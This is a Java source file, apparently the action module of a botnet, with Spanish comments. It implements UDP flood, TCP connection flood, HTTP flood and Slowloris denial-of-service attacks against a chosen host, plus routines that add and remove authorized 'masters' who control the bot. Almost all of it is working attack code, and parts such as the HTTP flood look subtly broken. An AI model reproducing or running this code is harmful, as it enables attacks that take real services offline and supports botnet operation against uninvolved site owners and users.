
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;

import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

import java.io.PrintWriter;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.util.LinkedList;
import java.util.Random;

public class Actions {

	// ATAQUES

	public static void floodUDP(String host, final long duration) throws Exception {
		final String target = resolve(host);
		System.out.println("UDP flood attack on " + target + "...");
		new Thread(new Runnable() {

			public void run() {
				try {
					long endTime = System.currentTimeMillis() + duration;
					DatagramSocket udpSocket = new DatagramSocket();
					while (System.currentTimeMillis() < endTime) {
						//byte[] data = new byte[65000];
						byte[] data = new byte[100];
						new Random().nextBytes(data);
						;
						try {
							udpSocket.send(new DatagramPacket(data, data.length, InetAddress.getByName(target),
									(int) (Math.random() * 65534) + 1));
						} catch (IOException ioe) {
						}
					}
					udpSocket.close();
				} catch (SocketException se) {
				}
			}
		}).start();
	}

	public static void floodTCP(String host, final int port, int thread, final long duration) throws Exception {
		final String target = resolve(host);
		System.out.println("TCP flood attack on " + target + "..");
		for (int i = 0; i < thread; i++) {
			new Thread(new Runnable() {

				public void run() {
					try {
						long endTime = System.currentTimeMillis() + duration;
						while (System.currentTimeMillis() < endTime) {
							new Socket(target, port); // Just checked an example
														// for it, just open a
														// socket rofl.
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}).start();
		}
	}

	public static void floodHTTP(String host, final long duration) throws Exception {
		final String target = resolve(host);
		System.out.println("HTTP flood attack on " + target + "..");
		new Thread(new Runnable() {
			public void run() {
				long endTime = System.currentTimeMillis() + duration;
				while (System.currentTimeMillis() < endTime) {
					try {
						HttpURLConnection conn = (HttpURLConnection) new URL(target).openConnection();
						conn.setRequestMethod("GET");
					} catch (IOException ex) {
						ex.printStackTrace();
					}
				}
			}
		}).start();
	}

	public static void floodSlowloris(String host, final int threads, final int delayz) throws Exception {
		final String target = resolve(host);
		System.out.println("Slowloris attack on " + target + " (using " + threads + " threads each)..");

		for (int i = 0; i < threads; i++) {
			new Thread(new Runnable() {
				public void run() {
					try {
						Socket socket = new Socket(target, 80);
						PrintWriter out = new PrintWriter(socket.getOutputStream());
						out.println("GET / HTTP/1.1");
						out.println("Host: " + target + "");
						out.println(
								"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)");
						out.println("Content-Length: 42");
						int iterations = 0;
						while (true) {
							if ((iterations * 1000) >= (delayz * 1000)) {
								break;
							}
							out.println("X-a: b");
							Thread.sleep(1000);
							iterations += 1;
						}
						out.close();
						socket.close();
						out = null;
						socket = null;
					} catch (Exception e) {
					}
				}
			}).start();
		}
	}

	// creo que el download no va a funcionar del todo

	// ADMINISTRATION
	/**
	 * Agrega un master autorizado nuevo
	 * 
	 * @param newMaster
	 * @param FILE_PATH
	 * @throws IOException
	 */
	public static void addMaster(String newMaster, String FILE_PATH) throws IOException {

		File archivo = new File(FILE_PATH);
		BufferedWriter bw = new BufferedWriter(new FileWriter(archivo, true));
		bw.newLine();
		bw.write(newMaster);
		bw.close();

	}

	/**
	 * Borra de la lista de masters autorizados el indicado
	 * 
	 * @param delMaster
	 * @param FILE_PATH
	 * @throws IOException
	 */
	public static void delMaster(String delMaster, String FILE_PATH) throws IOException {

		LinkedList<String> masters = new LinkedList<String>();
		File archivo = new File(FILE_PATH);

		BufferedReader br = new BufferedReader(new FileReader(archivo));
		String linea = "";
		while ((linea = br.readLine()) != null) {
			System.out.println(linea);
			masters.add(linea);
		}
		br.close();

		masters.remove(delMaster);

		BufferedWriter bw = new BufferedWriter(new FileWriter(archivo));

		for (String mast : masters) {
			bw.write(mast);
			bw.newLine();
		}
		bw.close();

	}

	private static String resolve(String host) throws Exception {
		URL url = null;
		if (host.contains("http://")) {
			url = new URL(host);
		} else {
			url = new URL("http://" + host);
		}
		return InetAddress.getByName(url.getHost()).getHostAddress();
	}

}